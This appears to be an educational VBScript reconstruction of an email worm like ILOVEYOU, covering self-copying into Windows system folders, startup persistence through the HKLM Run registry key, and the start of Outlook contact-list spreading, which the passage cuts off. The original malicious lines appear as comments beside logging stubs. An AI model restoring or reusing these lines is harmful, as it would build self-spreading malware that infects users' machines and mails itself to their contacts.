Dim fso, dirWin, sysDir, wormCopyPath, registryPath
Dim outlookApp, addressList, contact
Dim emailSubject, emailBody, attachmentName

' ============================================================================
' CORE MECHANISM 1: Initial Execution & Self-Replication
' ============================================================================
' The worm used VBScript's FileSystemObject to copy itself to system directories
' This allowed it to persist beyond the initial email attachment

Sub ReplicateToSystem()
    Dim fso, sysDir, localDir, wormFile, wormCopy
    
    ' Create FileSystemObject - the worm's primary file manipulation tool
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Get the current script location (the attached file)
    wormFile = WScript.ScriptFullName
    
    ' Copy to Windows System Directory
    ' Original behavior: copied to C:\Windows\System\MSKernel32.vbs
    sysDir = fso.GetSpecialFolder(1) ' 1 = System folder
    wormCopyPath = sysDir & "\MSKernel32.vbs"
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
    ' fso.CopyFile wormFile, wormCopyPath, True
    LogAction "SIMULATED: Would copy to " & wormCopyPath
    
    ' Copy to Windows Directory
    ' Original behavior: copied to C:\Windows\WinFilesystem.vbs
    dirWin = fso.GetSpecialFolder(0) ' 0 = Windows folder
    wormCopyPath = dirWin & "\WinFilesystem.vbs"
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
    ' fso.CopyFile wormFile, wormCopyPath, True
    LogAction "SIMULATED: Would copy to " & wormCopyPath
End Sub

' ============================================================================
' CORE MECHANISM 2: Registry Persistence
' ============================================================================
' The worm modified registry keys to ensure it ran on every system startup
' This is a classic persistence technique

Sub EstablishPersistence()
    Dim shell, regPath
    
    Set shell = CreateObject("WScript.Shell")
    
    ' Original behavior: Modified Run key to execute on startup
    ' HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32
    regPath = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32"
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
    ' shell.RegWrite regPath, sysDir & "\MSKernel32.vbs", "REG_SZ"
    LogAction "SIMULATED: Would write registry key: " & regPath
    
    ' Also modified Win.ini to include itself in the run sequence
    ' This ensured execution even if one method was blocked
End Sub

' ============================================================================
' CORE MECHANISM 3: Email Propagation via Outlook
' ============================================================================
' This was the primary infection vector - the worm accessed the victim's
' Outlook Address Book and sent itself to ALL contacts automatically

Sub SpreadViaEmail()
    Dim outlook, contacts, contact, mail
    
    On Error Resume Next
    
    ' Create Outlook Application object
    Set outlook = CreateObject("Outlook.Application")
    
    ' If Outlook is not installed/available, this branch fails silently
    If outlook Is Nothing Then
        LogAction "OUTLOOK NOT FOUND - Email propagation skipped"
        Exit Sub
    End If
    
    ' Original behavior: The worm accessed MAPI namespace for contacts
    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
